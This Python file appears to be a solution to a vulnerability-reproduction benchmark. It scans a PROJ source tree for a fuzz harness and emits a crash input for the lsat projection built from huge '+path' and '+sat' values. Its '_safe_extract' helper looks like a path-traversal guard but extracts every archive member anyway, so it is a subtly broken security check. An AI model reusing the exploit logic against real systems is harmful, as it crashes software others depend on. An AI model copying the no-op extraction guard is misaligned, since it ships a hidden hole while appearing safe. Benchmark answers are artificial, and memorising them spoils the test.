import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        if os.path.isdir(src_path):
            return self._generate_poc_from_root(src_path)

        if not tarfile.is_tarfile(src_path):
            return self._default_poc()

        with tempfile.TemporaryDirectory() as tmpdir:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    self._safe_extract(tf, tmpdir)
            except Exception:
                # If extraction fails, fall back to generic PoC
                return self._default_poc()
            return self._generate_poc_from_root(tmpdir)

    def _safe_extract(self, tar, path):
        def is_within_directory(directory, target):
            abs_directory = os.path.abspath(directory)
            abs_target = os.path.abspath(target)
            return os.path.commonprefix([abs_directory, abs_target]) == abs_directory

        for member in tar.getmembers():
            member_path = os.path.join(path, member.name)
            if not is_within_directory(path, member_path):
                continue
        tar.extractall(path)

    def _generate_poc_from_root(self, root_dir: str) -> bytes:
        embedded = self._find_embedded_poc(root_dir)
        if embedded is not None:
            return embedded

        proj_def = self._build_lsat_definition(root_dir)

        harness_path = self._find_harness(root_dir)
        harness_type = None
        if harness_path is not None:
            try:
                with open(harness_path, "r", encoding="utf-8", errors="ignore") as f:
                    code = f.read()
                harness_type = self._identify_harness_type(code)
            except Exception:
                harness_type = None

        return self._build_poc_bytes(harness_type, proj_def)

    def _find_embedded_poc(self, root_dir: str):
        target_sub = b"+proj=lsat"
        max_size = 4096
        best_data = None
        best_size = None

        for dirpath, _, filenames in os.walk(root_dir):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                    if st.st_size == 0 or st.st_size > max_size:
                        continue
                    with open(path, "rb") as f:
                        data = f.read()
                    if target_sub in data:
                        size = len(data)
                        if best_data is None or size < best_size:
                            best_data = data
                            best_size = size
                            if size == 38:
                                return best_data
                except Exception:
                    continue
        return best_data

    def _find_harness(self, root_dir: str):
        target = "LLVMFuzzerTestOneInput"
        for dirpath, _, filenames in os.walk(root_dir):
            for fn in filenames:
                if not fn.endswith((".c", ".cc", ".cpp", ".cxx", ".C", ".CPP", ".c++", ".C++")):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        code = f.read()
                    if target in code:
                        return path
                except Exception:
                    continue
        return None

    def _identify_harness_type(self, code: str):
        if "proj_create_crs_to_crs" in code:
            return "crs_to_crs"
        if "pj_init_plus" in code or "pj_init_ctx" in code:
            return "pj_init_plus"
        if re.search(r"\bproj_create\s*\(", code):
            return "proj_create"
        return "unknown"

    def _build_lsat_definition(self, root_dir: str) -> str:
        base_proj = "+proj=lsat"
        path_param_names = []
        sat_param_names = []

        pj_lsat_path = None
        for dirpath, _, filenames in os.walk(root_dir):
            for fn in filenames:
                if fn == "PJ_lsat.c":
                    pj_lsat_path = os.path.join(dirpath, fn)
                    break
            if pj_lsat_path:
                break

        if pj_lsat_path is not None:
            try:
                with open(pj_lsat_path, "r", encoding="utf-8", errors="ignore") as f:
                    code = f.read()
                matches = re.findall(r'pj_param\s*\([^"]*"([a-zA-Z][^"]*)"', code)
                for m in matches:
                    if len(m) >= 2:
                        key = m[1:]  # drop type char
                        low = key.lower()
                        if "path" in low and key not in path_param_names:
                            path_param_names.append(key)
                        if "sat" in low and key not in sat_param_names:
                            sat_param_names.append(key)
            except Exception:
                pass

        segments = [base_proj]

        if path_param_names:
            for name in path_param_names:
                segments.append("+" + name + "=1000000000")
        else:
            segments.append("+path=1000000000")

        if sat_param_names:
            for name in sat_param_names:
                segments.append("+" + name + "=1000000000")
        else:
            segments.append("+sat=1000000000")
            segments.append("+satnum=1000000000")

        return " ".join(segments)

    def _build_poc_bytes(self, harness_type, proj_def: str) -> bytes:
        if harness_type == "crs_to_crs":
            dst_def = "EPSG:4326"
            coords = "0 0 0"
            poc_str = proj_def + "\n" + dst_def + "\n" + coords + "\n"
        elif harness_type in ("proj_create", "pj_init_plus"):
            poc_str = proj_def
        else:
            dst_def = "EPSG:4326"
            coords = "0 0 0"
            poc_str = proj_def + "\n" + dst_def + "\n" + coords + "\n"

        try:
            return poc_str.encode("ascii")
        except Exception:
            return poc_str.encode("latin1", "replace")

    def _default_poc(self) -> bytes:
        return b"+proj=lsat +path=1000000000 +sat=1000000000\n"
